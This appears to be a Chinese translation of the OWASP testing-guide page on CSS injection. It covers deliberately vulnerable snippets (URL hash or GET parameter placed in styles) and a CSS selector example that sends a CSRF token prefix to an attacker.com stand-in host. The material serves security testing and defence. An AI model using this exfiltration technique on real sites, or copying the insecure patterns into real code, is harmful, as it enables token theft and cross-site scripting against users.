# 测试CSS注入

|ID          |
|------------|
|WSTG-CLNT-05|

## 概述

CSS注入漏洞涉及在受信任站点的上下文中在受害者浏览器中呈现任意CSS代码的能力。这种漏洞的影响因提供的CSS有效载荷而异。它可能导致跨站脚本或数据泄露。

当应用程序允许用户提供的CSS干扰应用程序的合法样式表时，会发生此漏洞。在CSS上下文中注入代码可以为攻击者提供在某些条件下执行JavaScript的能力，或使用CSS选择器和能够生成HTTP请求的函数提取敏感值。通常，允许用户通过提供自定义CSS文件来自定义页面的操作是相当大的风险。

以下JavaScript代码显示了一个可能的易受攻击脚本，其中攻击者能够控制`location.hash`（源），该源到达`cssText`函数（接收器）。这种特殊情况可能导致较旧浏览器版本中的基于DOM的XSS；有关详细信息，请参阅[基于DOM的XSS预防速查表](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)。

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

> **注意：**
一些基于CSS的JavaScript执行技术依赖于旧版浏览器行为（例如，较旧版本的IE和Opera）。虽然现代浏览器缓解了大多数这些向量，但CSS注入仍可实现数据泄露、UI操纵和攻击链接。

同一漏洞可能出现在反射型XSS的情况下，例如在以下PHP代码中：

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

进一步的攻击场景包括能够通过纯CSS规则提取数据的能力。这样的攻击可以通过CSS选择器进行，导致数据泄露，例如CSRF令牌。

这是尝试选择`name`匹配`csrf_token`且`value`以`a`开头的输入的代码示例。通过利用暴力攻击确定属性的`value`，可能发起攻击，将值发送到攻击者域，例如通过尝试在所选输入元素上设置背景图像。

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(https://attacker.com/log?a);
}
</style>
```

使用征集内容的其他攻击（如CSS）在[Mario Heiderich的演讲"Got Your Nose"](https://www.youtube.com/watch?v=FIQvAaZj_HA)中突出显示。

## 测试目标

- 识别CSS注入点。
- 评估注入的影响。

## 如何测试

应分析代码以确定是否允许用户在CSS上下文中注入内容。特别应检查站点如何根据输入返回CSS规则。

以下是一个基本示例：

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

上述代码包含由攻击者控制的源`location.hash`，该源可以直接注入到HTML元素的`style`属性中。如上所述，这可能导致取决于所使用的浏览器和所提供的有效载荷的不同结果。

以下页面提供了CSS注入漏洞的示例：

- [通过CSS和HTML5的密码"破解器"](https://html5sec.org/invalid/?length=25)
- [使用未转义输入的基于JavaScript的攻击`CSSStyleDeclaration`](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

有关防止CSS注入的其他OWASP资源，请参阅[保护级联样式表速查表](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html)。
